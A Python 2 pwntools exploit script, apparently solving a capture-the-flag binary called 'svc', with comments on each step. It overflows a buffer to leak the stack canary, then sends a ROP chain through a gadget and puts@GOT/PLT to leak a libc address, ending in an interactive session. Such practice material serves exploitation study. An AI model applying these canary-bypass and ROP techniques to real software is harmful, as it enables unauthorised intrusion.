#Import pwntools
from pwn import *

#Establish the target process, and attack gdb
target = process("./svc")
gdb.attach(target)
elf = ELF('svc')

#Establish the needed addresses
puts_got = 0x602018
puts_plt = 0x4008d0
gadget = 0x400ea3

log.info("puts_got is: " + hex(puts_got))
log.info("puts_plt is: " + hex(puts_plt))
log.info("gadget addr: " + hex(gadget))

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the canary
leak_payload = "0"*0xa8
target.sendline(leak_payload)
print target.recvuntil(">>")

#Select the second option, to print out our input and leak the canary
target.sendline('2')
print target.recvuntil("[*]PLEASE TREAT HIM WELL.....")
print target.recvline()
print target.recvline()
print target.recvline()

#Scan in, parse out, unpack, and print the stack canary
leak = target.recvline()
print len(leak)
canary = u64("\x00" + leak[0:7])
log.info("The Stack Canary is: " + hex(canary))

#Specify that the menu option to scan in data into memory
print target.recvuntil(">>")
target.sendline('1')
print target.recvuntil(">>")

#Send the payload, which will allow us to leak the puts address
leak_payload = "0"*0xa8 + p64(canary) + "1"*8 + p64(gadget) + p64(puts_got) + p64(puts_plt)
target.sendline(leak_payload)
print target.recvuntil(">>")

#Se;ect the option to exit the loop, then scan in the address
target.sendline('3')
print target.recvuntil("[*]BYE ~ TIME TO MINE MIENRALS...\n")
puts_leak = target.recvline()
puts_leak = u64(puts_leak[0:6] + (8 - len(puts_leak[0:6]))*"\x00")
log.info("puts_leak: " + hex(puts_leak))


#drop to an interactive shell
target.interactive()

